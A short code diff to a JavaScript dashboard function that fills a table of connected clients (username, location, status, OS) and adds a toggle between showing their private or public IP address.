@@ -189,13 +189,14 @@ async function updateDevices() {
 
         // Add a row to the table
         const row = document.createElement("tr");
+        if (private_public) {ip_state = clientData.private_ip} else {ip_state = clientData.public_ip}
         row.innerHTML = `
                     <td><input type="checkbox" class="row-select" data-row-id="${clientId}"></td>
                     <td>${clientData.username}</td>
                     <td>${clientData.geolocation.address}</td>
                     <td>${clientData.status}</td>
                     <td><img src="${osLogo}" alt="${osType} logo">${osType}</td>
-                    <td>${clientData.public_ip}</td>
+                    <td>${ip_state}</td>
                 `;
         tableBody.appendChild(row);
       });
